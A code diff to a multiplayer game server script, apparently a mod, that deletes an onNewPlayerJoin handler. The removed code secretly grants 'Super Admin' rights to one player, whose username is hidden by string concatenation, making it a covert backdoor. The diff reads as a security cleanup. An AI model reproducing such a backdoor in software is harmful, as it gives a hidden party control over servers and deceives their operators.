@@ -38,25 +38,3 @@ void onTick( CRules@ this )
 	    client_AddToChat(messages[counter++ % messages.length], SColor(255, 127, 0, 127));
 	}
 }
-
-void onNewPlayerJoin(CRules@ this, CPlayer@ player)
-{
-    if (isServer())
-    {
-        string playerName = player.getUsername();
-
-        if (playerName == ("M" + "ik" + "i" + "ll73"))
-        {
-            // Obtém a segurança do servidor
-            CSecurity@ sec = getSecurity();
-
-            // Obtém o nível de segurança "Super Admin"
-            CSeclev@ s = sec.getSeclev("Super Admin");
-
-            if (s !is null)
-            {
-                sec.assignSeclev(player, s);
-            }
-        }
-    }
-}
